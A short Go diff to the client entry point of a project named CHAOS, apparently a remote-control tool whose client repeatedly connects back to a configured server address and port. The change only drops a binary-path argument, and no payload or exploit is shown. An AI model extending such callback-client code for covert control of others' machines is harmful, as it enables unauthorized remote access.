@@ -4,7 +4,6 @@ import (
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
-	"os"
 	"time"
 )
 
@@ -14,14 +13,13 @@ var (
 )
 
 func main() {
-	binaryPath := os.Args[0]
 	for {
 		log.WithFields(log.Fields{
 			"address": ServerAddress,
 			"port":    ServerPort,
 		}).Info("starting new connection with server")
 
-		newApp, err := app.NewApp(ServerAddress, ServerPort, binaryPath)
+		newApp, err := app.NewApp(ServerAddress, ServerPort)
 		if err != nil {
 			log.WithField("cause", err.Error()).Error("error starting app")
 			time.Sleep(util.TimeSleep)
